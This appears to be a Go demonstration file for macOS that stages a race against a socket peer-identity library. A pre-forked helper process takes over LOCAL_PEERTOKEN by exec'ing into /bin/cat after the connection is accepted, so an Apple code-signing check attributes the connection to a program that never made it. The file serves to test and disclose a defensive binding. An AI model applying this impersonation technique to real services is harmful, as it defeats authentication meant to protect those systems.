//go:build darwin

package main

import (
	"fmt"
	"os"
	"time"

	identity "github.com/openabstractions/abstraction-identity"
	"golang.org/x/sys/unix"
)

// On macOS the peer is whoever wrote last, so the attack never has to touch
// the process that connected. A helper is started holding the socket before it
// is connected - so its start time predates the connection and no ConnectedAt
// check can exclude it - and after the service has accepted and bound, it
// becomes /bin/cat and writes one byte. LOCAL_PEERTOKEN follows that byte.
func attackRound() (*round, error) {
	l, sock, done, err := listen()
	if err != nil {
		return nil, err
	}
	defer done()

	fd, err := unix.Socket(unix.AF_UNIX, unix.SOCK_STREAM, 0)
	if err != nil {
		return nil, err
	}
	raw := os.NewFile(uintptr(fd), "peer")
	defer raw.Close()

	p, err := start("pre-forked", sock, raw)
	if err != nil {
		return nil, err
	}
	defer p.stop()
	forkedAt := time.Now()
	time.Sleep(50 * time.Millisecond)

	if err := unix.Connect(fd, &unix.SockaddrUnix{Name: sock}); err != nil {
		return nil, fmt.Errorf("connect: %w", err)
	}
	connectedAt := time.Now()

	c, b, at, err := accept(l)
	if err != nil {
		return nil, err
	}
	defer c.Close()
	defer b.Close()

	captured := b.Captured()
	p.release()
	if err := waitForExec(p.cmd.Process.Pid); err != nil {
		return nil, err
	}
	p.say("i am cat\n")

	c.SetReadDeadline(time.Now().Add(10 * time.Second))
	if _, err := c.Read(make([]byte, 64)); err != nil {
		return nil, fmt.Errorf("the impersonator never wrote: %w", err)
	}

	lookup, lerr := identity.OfConn(c, &identity.Options{ConnectedAt: at, CodeRequirement: "anchor apple"})
	rb, rerr := b.Peer()
	return &round{
		title: "round 2  a second process, older than the connection, writes one byte",
		narration: []string{
			fmt.Sprintf("pid %d was started %s before the connection existed, holding the socket unconnected",
				p.cmd.Process.Pid, connectedAt.Sub(forkedAt).Round(time.Millisecond)),
			fmt.Sprintf("pid %d then connected; the service accepted and bound", os.Getpid()),
			fmt.Sprintf("only then did pid %d become %s and write - so LOCAL_PEERTOKEN now names it, and its start time still predates the connection",
				p.cmd.Process.Pid, victim),
			"the lookup below is asked with CodeRequirement \"anchor apple\"",
		},
		verdict:  "the lookup handed over Apple's signature for a program that never connected; the binding refused it by name, but a socket cannot close the race that made it possible - XPC can",
		captured: answer{captured, nil},
		lookup:   answer{lookup, lerr},
		rebound:  answer{rb, rerr},
	}, nil
}

func waitForExec(pid int) error {
	deadline := time.Now().Add(15 * time.Second)
	for {
		if got, err := execPath(pid); err == nil && got == victim {
			return nil
		}
		if time.Now().After(deadline) {
			return fmt.Errorf("the peer never became %s", victim)
		}
		time.Sleep(2 * time.Millisecond)
	}
}

// execPath reads the executable path the kernel recorded at exec. The first
// four bytes of kern.procargs2 are the argument count; the path follows,
// NUL-terminated.
func execPath(pid int) (string, error) {
	raw, err := unix.SysctlRaw("kern.procargs2", pid)
	if err != nil {
		return "", err
	}
	if len(raw) < 4 {
		return "", fmt.Errorf("kern.procargs2 returned %d bytes", len(raw))
	}
	rest := raw[4:]
	for i, c := range rest {
		if c == 0 {
			return string(rest[:i]), nil
		}
	}
	return "", fmt.Errorf("no executable path in kern.procargs2")
}
